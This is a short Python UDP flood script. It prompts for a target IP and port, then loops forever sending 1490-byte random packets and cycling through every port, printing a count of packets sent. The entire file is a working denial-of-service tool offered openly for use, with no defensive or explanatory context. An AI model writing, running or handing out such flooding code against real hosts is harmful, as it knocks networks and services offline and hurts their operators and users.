import sys
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

ip = input("IP Target : ")
port = int(input("Port       : "))

sent = 0
def attack(ip, port, sent):
    while True:
        try:
            sock.sendto(bytes, (ip, port))
            sent = sent + 1
            port = port + 1
            print(f"Sent {sent} packet to {ip} through port:{port}")
            if port == 65534:
                port = 1
        except KeyboardInterrupt:
            print("\n[!] Stopped by user")
            sys.exit()
        except Exception:
            attack(ip, port, sent)

attack(ip, port, sent)